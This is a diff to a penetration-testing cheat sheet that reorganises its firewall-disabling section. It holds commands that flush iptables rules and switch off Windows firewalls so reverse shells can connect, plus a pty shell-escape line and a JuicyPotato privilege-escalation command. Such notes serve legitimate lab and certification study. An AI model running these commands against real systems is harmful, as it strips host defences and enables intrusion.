@@ -6,6 +6,7 @@
 ### [Shells](#Shells-1)
 ### [Linux Privilege Escalation](#Linux-Privilege-Escalation-1)
 ### [Windows Privilege Escalation](#Windows-Privilege-Escalation-1)
+### [Firewall Disabling](#Firewall-Disabling-1)
 ### [Compilation](#Compilation-1)
 ### [MSFvenom Payload Generation](#MSFvenom-Payload-Generation-1)
 ### [Hash Cracking](#Hash-Cracking-1)
@@ -470,24 +471,6 @@ Tricks
 * Try to URL encode payload if exploit is not working in webapp.
 * Try to remove firewall rules if rshell payloads don't trigger (see below). Confirm code exec by creating `test.txt` file on target if you have a way to identify that the file was created e.g. via. `smb` or `ftp` etc.
 
-
-Bypassing Linux firewalls
-```
-# flush Iptables - delete all rules temporarily.
-# add this command before executing reverse shell connection/command.
-$ iptables --flush
-```
-
-Bypassing Windows firewalls
-```
-# Win Vista, 7, 8, Server 2008, 10
-cmd> netsh advfirewall set allprofiles state off
-cmd> netsh advfirewall set currentprofile state off
-
-# Older Win, XP, Server 2003
-cmd> netsh firewall set opmode mode=DISABLE
-```
-
 Spawn TTY shell / rbash restricted shell escape
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -806,17 +789,24 @@ cmd> whoami /privs
 cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
 
-### Firewall Config / Disable
+## Firewall Disabling
 
-Netsh
+Bypassing Linux firewalls
 ```
-cmd> netsh [advfirewall] firewall show state name=all
-
-TODO: ADD DISABLE COMMANDS
+# flush Iptables - delete all rules temporarily.
+# add this command before executing reverse shell connection/command.
+$ iptables --flush
 ```
 
-### 
+Bypassing Windows firewalls
+```
+# Win Vista, 7, 8, Server 2008, 10
+cmd> netsh advfirewall set allprofiles state off
+cmd> netsh advfirewall set currentprofile state off
 
+# Older Win, XP, Server 2003
+cmd> netsh firewall set opmode mode=DISABLE
+```
 
 ## File Transfer Methods
 
